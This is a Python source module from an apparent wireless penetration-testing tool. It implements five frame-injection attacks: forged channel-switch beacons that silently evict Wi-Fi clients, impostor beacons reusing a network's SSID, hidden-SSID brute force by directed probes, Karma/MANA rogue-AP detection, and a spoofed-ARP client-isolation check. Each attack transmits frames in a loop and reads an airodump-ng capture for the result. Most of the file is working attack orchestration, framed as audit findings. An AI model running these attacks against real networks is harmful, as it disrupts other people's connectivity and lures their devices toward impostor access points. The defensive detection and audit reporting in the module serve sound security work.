# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""Lures: the frames that make a client do something, and the capture that proves it.

Five attacks that all follow the same shape — *transmit a small, specific lie, then
read the capture for the answer*:

* ``csa_attack``       — a Channel Switch Announcement in the AP's own name: clients
  that follow it leave the network without a single deauth frame being sent.
* ``ssid_confusion``   — the same SSID from a new BSSID: clients that trust a name
  rather than a BSSID will try to join the impostor.
* ``ssid_bruteforce``  — directed probes with dictionary names against a hidden AP:
  a misconfigured AP answers for the SSID it hides, disclosing it.
* ``karma_detect``     — probes for names that cannot exist: a device that answers
  *several* of them is a Karma/MANA-style rogue AP, which is worth knowing about.
* ``ap_isolation_audit`` — an ARP request between two clients: if the AP relays the
  reply, client isolation is off and the "guest network" is a flat network.

The point of the shape is that none of them claims more than the capture shows.  The
observation half runs the same decoder in demo mode as in live mode, so what the
tests exercise is the analysis, not a mock of it.
"""

from __future__ import annotations

import contextlib
import os
import struct
import time
from typing import Any, Dict, List, Optional, Sequence

from ..deps import registry
from ..models import STATUS_SUCCESS, AccessPoint, Attempt, Finding
from ..pcap import SUBTYPE_ASSOC_REQ, SUBTYPE_PROBE_REQ, SUBTYPE_PROBE_RESP, iter_frames
from ..rawtx import (RawInjector, build_assoc_request, build_csa_beacon,
                     build_probe_request, build_arp_request, injection_available,
                     spoofed_mac)
from ..util import Process, human_duration, mac_norm
from .base import Attack, AttackContext, AttackOutcome

#: management subtypes this module reads out of a capture
SUBTYPE_BEACON = 8

#: the 8-byte LLC/SNAP header in front of an ARP payload
LLC_SNAP = b"\xaa\xaa\x03\x00\x00\x00\x08\x06"


# --------------------------------------------------------------------------- #
# capture readers (shared by the attacks below and by their demo mode)
# --------------------------------------------------------------------------- #

def management_frames(path: str, subtypes: Sequence[int] = ()) -> List[Dict[str, Any]]:
    """Management frames from a capture: ``(subtype, dst, src, bssid, ies)``.

    Addresses are read straight out of the buffer because the generic walker only
    reports a BSSID for management frames — and these attacks care *who* was addressed,
    not just which network the frame belonged to.
    """
    wanted = set(subtypes) if subtypes else None
    found: List[Dict[str, Any]] = []
    for _ts, buf, start, length in iter_frames(str(path)):
        if length < 24:
            continue
        control = buf[start]
        if control & 0x03 or (control >> 2) & 0x03 != 0:   # must be management
            continue
        subtype = (control >> 4) & 0x0F
        if wanted is not None and subtype not in wanted:
            continue
        found.append({
            "subtype": subtype,
            "dst": mac_norm(bytes(buf[start + 4:start + 10]).hex(":")),
            "src": mac_norm(bytes(buf[start + 10:start + 16]).hex(":")),
            "bssid": mac_norm(bytes(buf[start + 16:start + 22]).hex(":")),
        })
    return found


def ssid_of_ies(ies: bytes) -> str:
    """The SSID element out of an IE blob (``""`` for hidden/wildcard)."""
    offset = 0
    while offset + 2 <= len(ies):
        tag, size = ies[offset], ies[offset + 1]
        body = ies[offset + 2:offset + 2 + size]
        if tag == 0:
            try:
                return body.decode("utf-8")
            except UnicodeDecodeError:
                return body.decode("latin-1", "replace")
        offset += 2 + size
    return ""


def beacon_like_ssids(path: str) -> List[Dict[str, str]]:
    """``{bssid, essid}`` for every beacon/probe response in a capture."""
    rows: List[Dict[str, str]] = []
    for _ts, buf, start, length in iter_frames(str(path)):
        if length < 36:
            continue
        control = buf[start]
        if control & 0x03 or (control >> 2) & 0x03 != 0:
            continue
        subtype = (control >> 4) & 0x0F
        if subtype not in (SUBTYPE_BEACON, SUBTYPE_PROBE_RESP):
            continue
        body = bytes(buf[start + 36:start + length])         # 24 header + 12 fixed
        ssid = ssid_of_ies(body)
        if ssid:
            rows.append({"bssid": mac_norm(bytes(buf[start + 16:start + 22]).hex(":")),
                         "essid": ssid,
                         "subtype": "beacon" if subtype == SUBTYPE_BEACON
                                    else "probe response"})
    return rows


def probe_answers(path: str) -> List[Dict[str, str]]:
    """Probe responses: who answered, and with what name."""
    rows: List[Dict[str, str]] = []
    for item in beacon_like_ssids(path):
        if item["subtype"] == "probe response":
            rows.append(item)
    return rows


def arp_replies(path: str) -> List[Dict[str, str]]:
    """ARP replies seen in a capture: ``{src, dst, sender_mac, sender_ip, bssid}``."""
    rows: List[Dict[str, str]] = []
    for _ts, buf, start, length in iter_frames(str(path)):
        if length < 40:
            continue
        control = buf[start]
        if control & 0x03 or (control >> 2) & 0x03 != 0x02:  # must be a data frame
            continue
        payload = bytes(buf[start + 24:start + length])
        index = payload.find(LLC_SNAP)
        if index < 0:
            continue
        arp = payload[index + 8:]
        if len(arp) < 28 or arp[6:8] != b"\x00\x02":         # opcode 2 = reply
            continue
        rows.append({
            "sender_mac": mac_norm(arp[8:14].hex(":")),
            "sender_ip": ".".join(str(part) for part in arp[14:18]),
            "target_mac": mac_norm(arp[18:24].hex(":")),
            "target_ip": ".".join(str(part) for part in arp[24:28]),
            "src": mac_norm(bytes(buf[start + 10:start + 16]).hex(":")),
            "bssid": mac_norm(bytes(buf[start + 16:start + 22]).hex(":")),
        })
    return rows


# --------------------------------------------------------------------------- #
# the shared lure machinery
# --------------------------------------------------------------------------- #

class _LureAttack(Attack):
    """Transmit a lie, capture the response, report only what the capture shows."""

    requires = ("airodump",)
    needs_injection = True
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    applies_to = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "WEP", "OPEN", "OWE",
                  "WPA-ENTERPRISE", "WPA2-ENTERPRISE", "ENTERPRISE")
    max_seconds = 30.0
    #: how long we listen for the answer, per round (seconds)
    observe_seconds = 6.0
    #: how many frames go out per round
    frames_per_round = 1
    warning = ""
    finding_title = ""
    finding_severity = "medium"
    finding_detail = ""
    #: the channel the observation runs on: ``None`` keeps the target's channel
    observe_channel_of_ap = True

    def applies(self, ap: AccessPoint) -> bool:
        return True

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True
        return bool(ctx.monitor) and injection_available(ctx.monitor)

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return ("the lure frames are built in-process, so this needs root/CAP_NET_RAW "
                f"and a monitor interface ({ctx.monitor or 'none'})")

    # -- the lie ------------------------------------------------------- #
    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        raise NotImplementedError

    def preflight(self, ctx: AttackContext, ap: AccessPoint) -> str:
        return ""

    # -- the observation ----------------------------------------------- #
    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        """Read the capture.  Returns the raw observations, not a conclusion."""
        return {}

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        """Turn the observations into a report: at least ``detail``."""
        return {"detail": "no observation"}

    def demo_capture(self, ctx: AttackContext, ap: AccessPoint, path: str) -> str:
        """Write a capture whose contents *are* the answer (demo mode only)."""
        from ..synth import write_pcap
        write_pcap(path, [])
        return path

    # ---------------------------------------------------------------- #
    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool,
            chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        skip = self.preflight(ctx, ap)
        if skip:
            ctx.session.end_attempt(attempt, "skipped", skip)
            return AttackOutcome.skipped(skip, f"{ap.display_name}: {skip}")
        seconds = min(ctx.config.attack_timeout_for(self.name), self.max_seconds)
        ctx.bus.log(f"{self.label} against {ap.display_name}: {self.warning}",
                    level="warning" if self.noise in ("loud", "extreme") else "info")
        if ctx.demo:
            return self._demo(ctx, ap, attempt)
        return self._live(ctx, ap, attempt, seconds)

    # ---------------------------------------------------------------- #
    def _finish(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                sent: int, observed: Dict[str, Any], report: Dict[str, Any],
                seconds: float, simulated: bool) -> AttackOutcome:
        detail = str(report.get("detail") or "no observation")
        title = str(report.get("title") or self.finding_title)
        severity = str(report.get("severity") or self.finding_severity)
        body = str(report.get("body") or self.finding_detail)
        extra = dict(report.get("extra") or {})
        extra.update({"frames": sent, "seconds": round(seconds, 1),
                      "simulated": simulated, "category": self.category,
                      "noise": self.noise, "impact": self.impact,
                      "observed": sorted(observed) if observed else [],
                      "note": extra.get("note", self.deliverable_note())})
        if simulated:
            detail += " (simulated)"
        ctx.session.add_finding(Finding(kind=self.name, severity=severity,
                                        bssid=ap.bssid, title=title,
                                        detail=f"{body} {detail}"))
        ap.remember(self.name, detail, frames=sent,
                    observed=sorted(observed) if observed else [])
        ctx.session.stats.lure_runs += 1
        self.bump_stats(ctx)
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, title, detail)
        return AttackOutcome.success(title, detail=detail, extra=extra)

    def bump_stats(self, ctx: AttackContext) -> None:
        """Counters the report and the dashboard read (one counter per family)."""

    def deliverable_note(self) -> str:
        return ("the deliverable is what the capture showed, not how clever the frame "
                "was: an unanswered lure is a negative result worth reporting")

    # ---------------------------------------------------------------- #
    def _demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        path = ctx.artifact_path(self.name, ap, ".pcap")
        started = time.time()
        for step in range(1, 4):
            ctx.progress(f"{self.label} on {ap.display_name}", kind="capture",
                         bssid=ap.bssid, percent=step * 30,
                         detail="transmitting the lure · simulation")
            time.sleep(0.25)
        self.demo_capture(ctx, ap, path)
        observed = self.observe(ctx, ap, path)
        report = self.interpret(ctx, ap, observed)
        return self._finish(ctx, ap, attempt, self.frames_per_round, observed, report,
                            time.time() - started, True)

    # ---------------------------------------------------------------- #
    def _live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
              seconds: float) -> AttackOutcome:
        if not self.available(ctx):
            return self._fail(ctx, attempt, "no injection path",
                              self.unavailable_reason(ctx))
        channel = ap.channel or 0
        observe_channel = channel if self.observe_channel_of_ap else 0
        prefix = ctx.artifact_path(self.name, ap, "")
        cap_path = prefix + "-01.cap"
        proc: Optional[Process] = None
        if registry.path("airodump-ng"):
            args = [registry.path("airodump-ng") or "airodump-ng", ctx.monitor]
            if observe_channel:
                args += ["-c", str(observe_channel)]
            args += ["--bssid", ap.bssid, "-w", prefix, "--output-format", "pcap",
                     "--write-interval", "1", "--ignore-negative-one"]
            proc = Process(args, name="airodump-ng", echo_lines=ctx.config.verbose_tools)
            proc.start()
            if proc.error:
                return self._fail(ctx, attempt, "could not start airodump-ng", proc.error)
        observed: Dict[str, Any] = {}
        sent = 0
        started = time.time()
        injector = RawInjector(ctx.monitor)
        try:
            if not injector.open():
                return self._fail(ctx, attempt, "could not open the injection socket",
                                  injector.result.error)
            while not ctx.want_stop() and time.time() - started < seconds:
                result = injector.send(list(self.frames(ctx, ap)))
                sent += result.sent
                if not result.sent and result.error:
                    break
                # listen for the answer before the next round of the lie
                time.sleep(self.observe_seconds)
                ctx.progress(f"{self.label} on {ap.display_name}", kind="capture",
                             bssid=ap.bssid, percent=min(95, (time.time() - started)
                                                         / seconds * 100),
                             detail=f"{sent} frame(s) sent, reading the capture")
                if os.path.exists(cap_path):
                    observed = self.observe(ctx, ap, cap_path)
                    if self.confirms(observed):
                        break
        finally:
            with contextlib.suppress(Exception):
                injector.close()
            if proc is not None:
                with contextlib.suppress(Exception):
                    proc.stop()
                time.sleep(0.6)                      # let airodump flush
        if not sent:
            return self._fail(ctx, attempt, "no frames were transmitted",
                              "the injection socket sent nothing: is the interface "
                              "really in monitor mode?")
        if os.path.exists(cap_path):
            observed = self.observe(ctx, ap, cap_path)
        report = self.interpret(ctx, ap, observed)
        if not registry.path("airodump-ng"):
            report = dict(report)
            report["detail"] = (f"{report.get('detail', '')} — airodump-ng is missing, "
                                f"so the lure was sent but nothing was read back")
        return self._finish(ctx, ap, attempt, sent, observed, report,
                            time.time() - started, False)

    def confirms(self, observed: Dict[str, Any]) -> bool:
        """Stop early when the capture already answers the question."""
        return False


class CsaAttack(_LureAttack):
    name = "csa_attack"
    label = "Channel-switch announcement (silent eviction)"
    tool = "wifipilot rawtx.py (CSA beacon)"
    description = ("Broadcast beacons carrying a Channel Switch Announcement in the "
                   "target's own name.  Clients that obey it move to the channel we "
                   "chose, with no deauthentication frame anywhere in the exchange — "
                   "nothing a deauth-counting WIDS can see, and nothing 802.11w covers. "
                   "The capture on the new channel is the evidence: it either shows the "
                   "clients or it does not.")
    noise = "moderate"
    impact = "degraded"
    observe_seconds = 6.0
    warning = ("a forged channel-switch announcement makes clients leave the channel; "
               "they will reconnect, but service is interrupted while they do")
    finding_title = "Clients follow an unauthenticated channel-switch announcement"
    finding_severity = "high"
    finding_detail = ("stations that were associated with this AP re-appeared on the "
                      "channel named in a forged Channel Switch Announcement.  The "
                      "element is a plain management frame, so any transmitter can move "
                      "a client off its network; only 802.11w with a client that "
                      "validates the transmitter prevents it.")

    def preflight(self, ctx: AttackContext, ap: AccessPoint) -> str:
        if not (ap.channel or 0):
            return "the AP's channel is unknown, so there is no announcement to forge"
        return ""

    def target_channel(self, ap: AccessPoint) -> int:
        """A channel to move clients to: the AP's own unless it is the only one."""
        channel = ap.channel or 1
        if channel in (1, 6, 11):
            return 11 if channel != 11 else 6
        return 1

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        new_channel = self.target_channel(ap)
        frames = [build_csa_beacon(ap.bssid, ap.essid or "", channel=ap.channel or 1,
                                   new_channel=new_channel, count=1, switch_mode=1,
                                   include_rsn=bool(ap.privacy))]
        # switch_mode 0 = "switch now", which some clients obey and others ignore;
        # sending both forms is what a real AP does during a channel change
        frames.append(build_csa_beacon(ap.bssid, ap.essid or "", channel=ap.channel or 1,
                                       new_channel=new_channel, count=0, switch_mode=0,
                                       include_rsn=bool(ap.privacy)))
        return frames

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        stations = set(ap.clients)
        seen = [item for item in management_frames(path, (SUBTYPE_PROBE_REQ,))
                if item["src"] in stations]
        return {"new_channel": self.target_channel(ap),
                "clients": sorted(stations), "probes_on_new_channel": seen}

    def confirms(self, observed: Dict[str, Any]) -> bool:
        return bool(observed.get("probes_on_new_channel"))

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        followed = observed.get("probes_on_new_channel") or []
        new_channel = observed.get("new_channel", self.target_channel(ap))
        if followed:
            who = ", ".join(sorted({item["src"] for item in followed})[:4])
            return {"title": self.finding_title, "severity": "high",
                    "body": self.finding_detail,
                    "detail": (f"{len(followed)} probe request(s) from station(s) "
                               f"{who} on channel {new_channel} after the forged "
                               f"announcement"),
                    "extra": {"followed": [item["src"] for item in followed],
                              "new_channel": new_channel},
                    "note": ("the clients moved without a deauth frame being sent: a "
                             "WIDS counting disconnects reports nothing")}
        return {"title": "Channel-switch announcement sent (no client moved)",
                "severity": "medium", "body": self.finding_detail,
                "detail": (f"no probe from a known client on channel {new_channel} "
                           f"within the observation window: the clients here ignore a "
                           f"forged CSA, or 802.11w refused it"),
                "extra": {"followed": [], "new_channel": new_channel}}

    def demo_capture(self, ctx: AttackContext, ap: AccessPoint, path: str) -> str:
        from ..synth import write_pcap
        from ..rawtx import frame_only
        station = next(iter(ap.clients), "") or spoofed_mac(4242)
        frames = [frame_only(frame) for frame in self.frames(ctx, ap)]
        # the evidence: a station that was on the old channel probing on the new one
        frames.append(frame_only(build_probe_request(station, ssid=ap.essid or "")))
        if len(ap.clients) > 1 and int(ap.bssid.replace(":", ""), 16) % 2:
            # some networks get the negative branch: nobody followed the announcement
            frames = frames[:-1]
        write_pcap(path, frames)
        return path


class SsidConfusionAttack(_LureAttack):
    name = "ssid_confusion"
    label = "SSID confusion (impostor BSSID)"
    tool = "wifipilot rawtx.py (beacon, existing SSID)"
    description = ("Beacon the target's SSID from a BSSID that does not exist, with a "
                   "stronger presence than the real AP.  Clients that select a network "
                   "by name alone will try to associate with the impostor — which is "
                   "where credentials would be collected by a full rogue AP.  The "
                   "capture shows whether any station took the bait.")
    noise = "moderate"
    impact = "degraded"
    observe_seconds = 6.0
    frames_per_round = 3
    warning = ("an impostor beacon for this SSID is broadcast; clients may try to "
               "associate with a BSSID that is not the real AP")
    finding_title = "Stations select a network by SSID alone (impostor beacon answered)"
    finding_severity = "high"
    finding_detail = ("a station that knew this SSID sent a probe or association request "
                      "towards a BSSID that had never been seen before and did not "
                      "belong to this network.  Nothing authenticated the impostor's "
                      "beacons, so the client's only defence is remembering the BSSID "
                      "and validating the AP it associates with (802.11w, or a managed "
                      "SSID list).")

    def impostor(self, ap: AccessPoint) -> str:
        """A stable, obviously-fake BSSID for the impostor (deterministic per AP)."""
        seed = int(ap.bssid.replace(":", ""), 16) & 0xFFFFFF
        return spoofed_mac(seed, locally_administered=False)

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        from ..rawtx import build_ssid_confusion_beacon

        impostor = self.impostor(ap)
        channel = ap.channel or 6
        return [build_ssid_confusion_beacon(impostor, ap.essid or "confused", channel)
                for _ in range(self.frames_per_round)]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        impostor = self.impostor(ap)
        stations = set(ap.clients)
        requests = [item for item in management_frames(
            path, (SUBTYPE_PROBE_REQ, SUBTYPE_ASSOC_REQ))
            if item["bssid"] == impostor
            or (item["subtype"] == SUBTYPE_PROBE_REQ and item["src"] in stations
                and item["dst"] == impostor)]
        # a probe request names the SSID in its IEs; the imposter answer is the point
        return {"impostor": impostor, "requests": requests, "clients": sorted(stations)}

    def confirms(self, observed: Dict[str, Any]) -> bool:
        return bool(observed.get("requests"))

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        requests = observed.get("requests") or []
        impostor = observed.get("impostor", "")
        if requests:
            who = ", ".join(sorted({item["src"] for item in requests})[:4])
            return {"title": self.finding_title, "severity": "high",
                    "body": self.finding_detail,
                    "detail": (f"{len(requests)} frame(s) from {who} aimed at the "
                               f"impostor BSSID {impostor}")}
        return {"title": "Impostor beacon sent (no station took the bait)",
                "severity": "medium", "body": self.finding_detail,
                "detail": (f"no probe or association request for {ap.essid or 'the SSID'} "
                           f"appeared towards the impostor BSSID {impostor} in the "
                           f"window: these clients remember more than the name"),
                "extra": {"impostor": impostor}}

    def demo_capture(self, ctx: AttackContext, ap: AccessPoint, path: str) -> str:
        from ..synth import write_pcap
        from ..rawtx import frame_only
        impostor = self.impostor(ap)
        frames = [frame_only(frame) for frame in self.frames(ctx, ap)]
        station = next(iter(ap.clients), "") or spoofed_mac(5150)
        if int(ap.bssid.replace(":", ""), 16) % 2:
            # a station that remembers the name and not the BSSID tries the impostor
            frames.append(frame_only(build_assoc_request(impostor, station,
                                                         ssid=ap.essid or "")))
        write_pcap(path, frames)
        return path


class SsidBruteforceAttack(_LureAttack):
    name = "ssid_bruteforce"
    label = "Hidden-SSID brute force (directed probes)"
    tool = "wifipilot rawtx.py (probe requests, wordlist)"
    description = ("Probe a hidden network for one name at a time from a client's own "
                   "address.  A hidden AP is supposed to reveal its SSID only to "
                   "stations that already know it — so an AP that answers probes for "
                   "names it does not have is broken, and an AP that answers the right "
                   "one discloses the name it was hiding.  Patient and quiet: one probe "
                   "per second, not a dictionary flood (that is ``probe_flood``).")
    noise = "moderate"
    impact = "info"
    observe_seconds = 3.0
    warning = ("directed probe requests for dictionary names are sent at a hidden "
               "network; each one is a visible frame from a station address")
    finding_title = "Hidden SSID disclosed by a directed probe"
    finding_severity = "medium"
    finding_detail = ("the hidden network answered a directed probe request with a "
                      "probe response naming its SSID.  Hiding an SSID was never a "
                      "security control — it is an obscurity measure that stops working "
                      "the moment an AP answers a name it should not know.")

    #: the dictionary used when no wordlist is configured
    words = ("Home", "home", "wifi", "WiFi", "WLAN", "default", "NETGEAR", "linksys",
             "TP-LINK", "FRITZ!Box", "KabelBox", "Vodafone", "Gastzugang", "IoT",
             "Guest", "Office", "CorpNet", "Lab", "printer", "camera")

    def preflight(self, ctx: AttackContext, ap: AccessPoint) -> str:
        if ap.essid:
            return f"{ap.display_name} already broadcasts its SSID"
        return ""

    def words_for(self, ctx: AttackContext) -> List[str]:
        """The dictionary: the config's wordlist when there is one, the panel otherwise."""
        path = getattr(ctx.config, "wordlist", "") or ""
        words: List[str] = []
        if path and os.path.exists(path):
            with contextlib.suppress(OSError):
                with open(path, "r", errors="replace") as handle:
                    for line in handle:
                        line = line.strip()
                        if 0 < len(line) <= 32:
                            words.append(line)
                        if len(words) >= 64:
                            break
        return (words or list(self.words))[:64]

    def station(self, ap: AccessPoint) -> str:
        """Probe as a station the AP already knows, when one is known."""
        return next(iter(ap.clients), "") or spoofed_mac(21_000)

    #: probes sent per BSSID, so the report can say how many names were tried
    probes: Dict[str, int] = None                     # type: ignore[assignment]

    def __init__(self) -> None:
        self.probes = {}

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        count = self.probes.get(ap.bssid, 0)
        words = self.words_for(ctx)
        word = words[count % len(words)]
        self.probes[ap.bssid] = count + 1
        return [build_probe_request(self.station(ap), ssid=word)]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        answers = [item for item in probe_answers(path)
                   if item["bssid"] == ap.bssid]
        return {"answers": answers, "probes_sent": self.probes.get(ap.bssid, 0)}

    def confirms(self, observed: Dict[str, Any]) -> bool:
        return bool(observed.get("answers"))

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        answers = observed.get("answers") or []
        names = sorted({item["essid"] for item in answers if item["essid"]})
        probed = observed.get("probes_sent", 0)
        if names:
            return {"title": self.finding_title, "severity": "medium",
                    "body": self.finding_detail,
                    "detail": (f"{ap.bssid} answered {len(answers)} probe(s) and "
                               f"disclosed {', '.join(names[:4])}"),
                    "extra": {"ssid": names[0], "answers": len(answers)}}
        return {"title": "Hidden SSID held (no answer to a directed probe)",
                "severity": "low", "body": self.finding_detail,
                "detail": (f"no probe response from {ap.bssid} after {probed} directed "
                           f"probe(s): the AP does not answer names it does not have, "
                           f"which is the correct behaviour"),
                "extra": {"ssid": ""}}

    def demo_capture(self, ctx: AttackContext, ap: AccessPoint, path: str) -> str:
        from ..synth import write_pcap
        from ..rawtx import build_probe_response, frame_only
        words = self.words_for(ctx)
        frames = [frame_only(build_probe_request(self.station(ap), ssid=word))
                  for word in words[:3]]
        if int(ap.bssid.replace(":", ""), 16) % 2:
            frames.append(frame_only(build_probe_response(self.station(ap), ap.bssid,
                                                          ssid="Lab-IoT")))
        write_pcap(path, frames)
        return path


class KarmaDetectAttack(_LureAttack):
    name = "karma_detect"
    label = "Karma/MANA rogue-AP detection (probe all names)"
    tool = "wifipilot rawtx.py (probe requests, random names)"
    description = ("Probe for names that cannot exist.  A normal AP answers nothing; a "
                   "device whose business model is answering everything — Karma, MANA, "
                   "a rogue AP hunting for the PNL of every station nearby — answers "
                   "several of them.  This is a *detection* attack: it exists to find a "
                   "rogue AP in an environment, and it is the one attack here whose "
                   "target is the attacker.")
    noise = "quiet"
    impact = "info"
    observe_seconds = 8.0
    frames_per_round = 4
    warning = ("probe requests for names that do not exist are sent from one fixed "
               "station address; only a device that answers any name will respond")
    finding_title = "A device is answering probes for names that cannot exist"
    finding_severity = "high"
    finding_detail = ("one transmitter answered probe requests for more than one "
                      "made-up network name.  That is Karma/MANA behaviour: a rogue AP "
                      "claiming every SSID a client remembers, which is how credentials "
                      "and hashes are collected.  A legitimate AP never does this, "
                      "because it does not know the names it would have to claim.")

    def station(self, ap: AccessPoint) -> str:
        return spoofed_mac(13_000, locally_administered=True)

    def fake_names(self) -> List[str]:
        return ["wifipilot-probe-one", "wifipilot-probe-two", "wifipilot-probe-three",
                "wifipilot-probe-four"]

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.station(ap)
        return [build_probe_request(station, ssid=name) for name in self.fake_names()]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        probe_mac = self.station(ap)
        answers = [item for item in probe_answers(path)
                   if item["bssid"] and item["essid"] in self.fake_names()]
        by_bssid: Dict[str, List[str]] = {}
        for item in answers:
            by_bssid.setdefault(item["bssid"], []).append(item["essid"])
        return {"probe_mac": probe_mac, "answers": answers, "by_bssid": by_bssid,
                "names": self.fake_names()}

    def confirms(self, observed: Dict[str, Any]) -> bool:
        return any(len(names) > 1 for names in (observed.get("by_bssid") or {}).values())

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        by_bssid: Dict[str, List[str]] = observed.get("by_bssid") or {}
        culprits = {bssid: names for bssid, names in by_bssid.items()
                    if len(set(names)) > 1}
        if culprits:
            bssid = sorted(culprits)[0]
            return {"title": self.finding_title, "severity": "high",
                    "body": self.finding_detail,
                    "detail": (f"{bssid} answered {len(set(culprits[bssid]))} different "
                               f"made-up names: {', '.join(sorted(set(culprits[bssid])))}"),
                    "extra": {"karma_bssids": sorted(culprits),
                              "answered": {key: sorted(set(value))
                                           for key, value in culprits.items()}},
                    "note": ("this is a defensive finding: the rogue AP being detected "
                             "is somebody else's attack")}
        single = [bssid for bssid, names in by_bssid.items() if len(set(names)) == 1]
        if single:
            return {"title": "A device answered one made-up name (suspicious)",
                    "severity": "medium", "body": self.finding_detail,
                    "detail": (f"{', '.join(sorted(single))} answered a probe for a "
                               f"name that does not exist; one answer can be a "
                               f"misconfigured repeater, several mean Karma"),
                    "extra": {"karma_bssids": []}}
        return {"title": "No Karma behaviour found", "severity": "low",
                "body": self.finding_detail,
                "detail": (f"{len(self.fake_names())} made-up names probed, nothing "
                           f"answered any of them: the visible infrastructure behaves"),
                "extra": {"karma_bssids": []}}

    def bump_stats(self, ctx: AttackContext) -> None:
        ctx.session.stats.rogue_detections += 1

    def demo_capture(self, ctx: AttackContext, ap: AccessPoint, path: str) -> str:
        from ..synth import write_pcap
        from ..rawtx import build_probe_response, frame_only
        station = self.station(ap)
        names = self.fake_names()
        frames = [frame_only(build_probe_request(station, ssid=name)) for name in names]
        if int(ap.bssid.replace(":", ""), 16) % 2:
            # the rogue device answers two different names from the same BSSID
            rogue = spoofed_mac(999, locally_administered=True)
            for name in names[:2]:
                frames.append(frame_only(build_probe_response(station, rogue, ssid=name)))
        else:
            # ...or nothing answers, which is the healthy case
            frames.append(frame_only(build_probe_response(station, ap.bssid,
                                                          ssid=ap.essid or "Real")))
        write_pcap(path, frames)
        return path


class ApIsolationAuditAttack(_LureAttack):
    name = "ap_isolation_audit"
    label = "Client-isolation audit (spoofed ARP)"
    tool = "wifipilot rawtx.py (ARP request between two clients)"
    description = ("Ask, from one client's address, who owns the IP of another client.  "
                   "If an ARP reply comes back, the AP forwarded a frame between two "
                   "stations — which is exactly what client isolation is supposed to "
                   "prevent.  A guest network that is not isolated is a flat network: "
                   "every other guest can reach the printer, the NAS and the laptop.")
    noise = "quiet"
    impact = "info"
    observe_seconds = 5.0
    warning = ("a handful of ARP frames is sent with a client's own address as the "
               "source; the AP may log a duplicate-address warning")
    finding_title = "Client isolation is not enforced (clients reach each other)"
    finding_severity = "high"
    finding_detail = ("the AP relayed an ARP reply between two stations, so clients on "
                      "this network can address each other directly.  For a guest or "
                      "IoT network that is the whole control: without isolation a "
                      "compromised device is one hop from every other device, and the "
                      "network's own web interface.")

    def applies(self, ap: AccessPoint) -> bool:
        # there have to be two stations for a client-to-client frame to make sense
        return len(ap.clients) >= 2

    def preflight(self, ctx: AttackContext, ap: AccessPoint) -> str:
        if len(ap.clients) < 2:
            return "fewer than two clients seen: client-to-client traffic cannot be tested"
        return ""

    def stations(self, ap: AccessPoint) -> List[str]:
        return list(ap.clients)[:2]

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        source, target = self.stations(ap)
        # a believable private address: the AP's subnet, guessed from the vendor's default
        return [build_arp_request(source, "192.168.1.50", "192.168.1.77",
                                  bssid=ap.bssid, broadcast=True),
                build_arp_request(source, "192.168.0.50", "192.168.0.77",
                                  bssid=ap.bssid, broadcast=True)]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        _source, target = self.stations(ap)
        replies = [item for item in arp_replies(path)
                   if item["sender_mac"] in set(self.stations(ap))
                   and item["bssid"] == ap.bssid]
        return {"replies": replies, "target": target,
                "clients": self.stations(ap)}

    def confirms(self, observed: Dict[str, Any]) -> bool:
        return bool(observed.get("replies"))

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        replies = observed.get("replies") or []
        if replies:
            who = sorted({item["sender_mac"] for item in replies})
            return {"title": self.finding_title, "severity": "high",
                    "body": self.finding_detail,
                    "detail": (f"{len(replies)} ARP repl(ies) relayed between "
                               f"{' and '.join(observed.get('clients', []))} "
                               f"(sender(s): {', '.join(who)})"),
                    "extra": {"replies": replies, "isolated": False},
                    "note": ("an ARP reply from another client is proof the AP "
                             "bridged their traffic; a single silent broadcast would "
                             "not be")}
        return {"title": "Client isolation appears to be enforced",
                "severity": "low", "body": self.finding_detail,
                "detail": (f"no reply between the two known clients of {ap.bssid}: the "
                           f"AP did not bridge a unicast frame between them "
                           f"(broadcast ARP is still forwarded by most APs)"),
                "extra": {"replies": [], "isolated": True}}

    def demo_capture(self, ctx: AttackContext, ap: AccessPoint, path: str) -> str:
        from ..synth import write_pcap
        from ..rawtx import build_arp_reply, frame_only
        source, target = self.stations(ap)
        frames = [frame_only(frame) for frame in self.frames(ctx, ap)]
        if int(ap.bssid.replace(":", ""), 16) % 2:
            frames.append(frame_only(build_arp_reply(target, "192.168.1.77", source,
                                                     "192.168.1.50", bssid=ap.bssid)))
        write_pcap(path, frames)
        return path
